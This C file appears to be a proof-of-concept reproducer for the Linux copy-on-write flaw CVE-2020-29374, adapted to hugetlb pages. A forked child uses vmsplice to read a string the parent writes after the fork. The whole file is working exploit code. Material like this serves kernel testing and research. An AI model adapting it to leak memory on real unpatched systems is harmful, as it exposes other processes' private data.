/*
 * Slightly modified version of the CVE-2020-29374 exploit:
 * https://bugs.chromium.org/p/project-zero/issues/detail?id=2045
 * Which uses hugetlb instead.
 *
 * Note that you need at least one hugetlb page, for example, via:
 *   echo 1 > /sys/devices/system/node/node0/hugepages/hugepages-2048kB/nr_hugepages
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <err.h>
#include <unistd.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/errno.h>

#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  if (__res == (typeof(x))-1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})

static void *data;

static void child_fn(void) {
  int pipe_fds[2];
  SYSCHK(pipe(pipe_fds));
  struct iovec iov = {.iov_base = data, .iov_len = 2*1024*1024 };
  SYSCHK(vmsplice(pipe_fds[1], &iov, 1, 0));
  SYSCHK(munmap(data, 2*1024*1024));
  sleep(2);
  char buf[2*1024*1024];
  SYSCHK(read(pipe_fds[0], buf, 2*1024*1024));
  printf("read string from child: %s\n", buf);
}

int main(void) {
  data = mmap(NULL, 2*1024*1024, PROT_READ|PROT_WRITE,
              MAP_ANONYMOUS|MAP_PRIVATE|MAP_HUGETLB, -1, 0);
  if (data == MAP_FAILED) {
    perror("mmap(MAP_HUGETLB) failed");
    return -errno;
  }

  strcpy(data, "BORING DATA");

  pid_t child = SYSCHK(fork());
  if (child == 0) {
    child_fn();
    return 0;
  }

  sleep(1);
  strcpy(data, "THIS IS SECRET");

  int status;
  SYSCHK(wait(&status));
}
